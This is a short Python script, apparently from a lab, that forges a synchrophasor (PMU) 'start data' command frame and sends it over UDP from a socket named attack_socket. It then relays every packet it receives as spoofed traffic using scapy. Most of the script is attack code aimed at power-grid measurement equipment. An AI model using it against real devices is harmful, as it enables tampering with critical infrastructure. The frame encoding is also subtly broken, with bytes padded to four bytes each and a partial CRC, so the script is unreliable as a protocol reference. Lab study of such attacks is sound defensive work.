import socket
from scapy.all import *
import time


def compute_CRC(message, length):
    crc = 0x0ffff
    temp = None
    quick = None
    for i in range(0, length):
        temp = (crc >> 8) ^ message[i]
        crc <<= 8
        quick = temp ^ (temp >> 4)
        crc ^= quick
        quick <<= 5
        crc ^= quick
        quick <<= 7
        crc ^= quick
    return crc


# Create a socket object
attack_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Get local machine name
attack_socket.bind(('127.0.0.1', 5000))

# Data = "aa410012000a6402422e0000000000053ad1"
# Data = "aa410012000a640243b6000000000005722d"
CMDSYNC = [0, 10]
message = CMDSYNC[0].to_bytes(4, byteorder='big')
message += CMDSYNC[1].to_bytes(4, byteorder='big')
fsize = [18 >> 8, 18]
message += fsize[0].to_bytes(4, byteorder='big')
message += fsize[1].to_bytes(4, byteorder='big')
pmu_id = [0, 10]
message += pmu_id[0].to_bytes(4, byteorder='big')
message += pmu_id[1].to_bytes(4, byteorder='big')
sec = time.time()
sec = int(sec)
sec = [sec >> 24, sec >> 16, sec >> 8, sec]
message += sec[0].to_bytes(4, byteorder='big')
message += sec[1].to_bytes(4, byteorder='big')
message += sec[2].to_bytes(4, byteorder='big')
message += sec[3].to_bytes(4, byteorder='big')
fracsec = [0, 0, 0, 0]
message += fracsec[0].to_bytes(4, byteorder='big')
message += fracsec[1].to_bytes(4, byteorder='big')
message += fracsec[2].to_bytes(4, byteorder='big')
message += fracsec[3].to_bytes(4, byteorder='big')
CMDDATASEND = [0, 5]
message += CMDDATASEND[0].to_bytes(4, byteorder='big')
message += CMDDATASEND[1].to_bytes(4, byteorder='big')
chk = compute_CRC(message, 16)
Chk1 = (chk >> 8) & ~(~0 << 8)
chk2 = chk & ~(~0 << 8)
message += Chk1.to_bytes(4, byteorder='big')
message += chk2.to_bytes(4, byteorder='big')
Data = message.hex()
Data = Data.encode('utf-8')
attack_socket.sendto(Data, ('127.0.0.1', 4000))
d = Data.decode('utf-8')
print(d)

# Receive no more than 1024 bytes

print('listening for messages...')

while True:
    data, addr = attack_socket.recvfrom(1024)
    print('Received from %s: %s' % (addr, data))
    ip = IP(src=addr[0], dst="127.0.0.1")
    udp = UDP(sport=addr[1], dport=4800)
    payload = data
    packet = ip/udp/payload
    send(packet)
